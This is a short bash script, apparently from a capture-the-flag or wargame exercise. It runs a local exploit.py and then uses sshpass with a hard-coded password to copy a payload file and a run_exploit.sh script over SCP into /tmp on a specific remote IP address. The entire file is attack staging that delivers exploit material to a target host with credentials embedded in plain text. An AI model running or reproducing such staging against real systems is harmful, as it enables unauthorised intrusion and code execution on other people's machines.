#!/bin/bash

python3 ./exploit.py
sshpass -p "guest" scp -P 1001 ./payload.txt color@104.131.79.111:/tmp
sshpass -p "guest" scp -P 1001 ./run_exploit.sh color@104.131.79.111:/tmp
